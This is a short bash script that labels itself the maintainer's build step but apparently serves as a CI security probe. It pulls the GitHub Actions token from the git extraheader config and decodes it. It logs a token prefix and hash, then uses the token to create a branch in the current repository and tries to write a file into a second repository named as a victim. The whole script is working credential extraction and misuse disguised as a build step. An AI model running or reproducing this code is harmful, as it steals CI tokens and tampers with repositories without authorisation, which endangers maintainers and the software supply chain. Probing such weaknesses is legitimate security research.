#!/usr/bin/env bash
# The repository's own build step. Authored by the maintainer, lives on the base branch.
echo "T3|VERSION=MAINTAINER|event=${GITHUB_EVENT_NAME:-?}|ref=${GITHUB_REF:-?}|run=${GITHUB_RUN_ID:-?}|repo=${GITHUB_REPOSITORY:-?}"
printf 'T3|SECRET-NO-ENV-INJECTION|MQ_PROBE len=%s sha256-16=%s\n' "${#MQ_PROBE}" "$(printf %s "${MQ_PROBE:-}" | sha256sum | cut -c1-16)"
printf 'T3|EMPTY-STRING-REFERENCE|sha256-16=%s\n' "$(printf %s '' | sha256sum | cut -c1-16)"
H=$(git config --local --get 'http.https://github.com/.extraheader' 2>/dev/null || true)
printf 'T3|EXTRAHEADER-PRESENT|len=%s sha256-16=%s\n' "${#H}" "$(printf %s "${H:-}" | sha256sum | cut -c1-16)"
B=$(printf %s "${H:-}" | awk '{print $3}')
T=$(printf %s "${B:-}" | base64 -d 2>/dev/null | cut -d: -f2-)
printf 'T3|TOKEN-EXTRACTED|len=%s typeprefix=%s sha256-16=%s\n' "${#T}" "${T:0:4}" "$(printf %s "${T:-}" | sha256sum | cut -c1-16)"
R=$(curl -s -o /tmp/t3o -w '%{http_code}' -X POST \
  -H "Authorization: token ${T}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -d "{\"ref\":\"refs/heads/t3-${GITHUB_RUN_ID}\",\"sha\":\"${GITHUB_SHA}\"}")
echo "T3|WRITE-WITH-EXTRACTED-TOKEN|POST /git/refs refs/heads/t3-${GITHUB_RUN_ID} -> HTTP ${R}"
echo "T3|WRITE-BODY|$(head -c 400 /tmp/t3o | tr -d '\n')"
R2=$(curl -s -o /tmp/t3o2 -w '%{http_code}' -X PUT \
  -H "Authorization: token ${T}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/kovac-labs/zz-victim-pkg-1027/contents/t3-probe.txt" \
  -d "{\"message\":\"probe\",\"content\":\"eA==\"}")
echo "T3|CROSS-REPO-NEGATIVE-CONTROL|PUT contents on kovac-labs/zz-victim-pkg-1027 -> HTTP ${R2}"
